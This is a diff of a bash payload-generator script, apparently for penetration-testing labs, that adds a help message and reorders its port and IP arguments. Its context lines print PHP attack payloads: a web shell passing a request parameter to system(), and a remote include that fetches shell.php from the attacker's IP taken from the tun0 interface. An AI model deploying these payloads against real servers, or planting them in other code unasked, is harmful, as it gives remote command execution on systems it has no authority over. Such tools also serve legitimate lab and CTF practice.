@@ -1,12 +1,16 @@
 #!/bin/bash
 
-#-----[by h4rithd.com]
+usage() { 
+    echo -e "[-----ScriptBy:h4rithd.com-----]" 
+    echo -e "Usage: $0 [ph,py..] [port] [ip] \n" 
+} 
 
 port=4545
 ip="$(ip addr show | grep 'global tun0' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')"
 
-[[ ! -z "$2" ]] && ip=$2
-[[ ! -z "$3" ]] && port=$3
+[[ ! -z "$2" ]] && port=$2
+[[ ! -z "$3" ]] && ip=$3
+
 
 function listener {
     if [[ -z "$1" ]]
@@ -28,6 +32,9 @@ function listener {
 }
 
 case "$1" in 
+    "--help" | "-h" | "--h" | "-help")
+        usage
+        exit 0;;
     "ph") #Php
         echo -e "<?php system(\$_REQUEST['cmd']); ?>";
         echo -e "<?php include(\"http://$ip/shell.php\"); ?>";
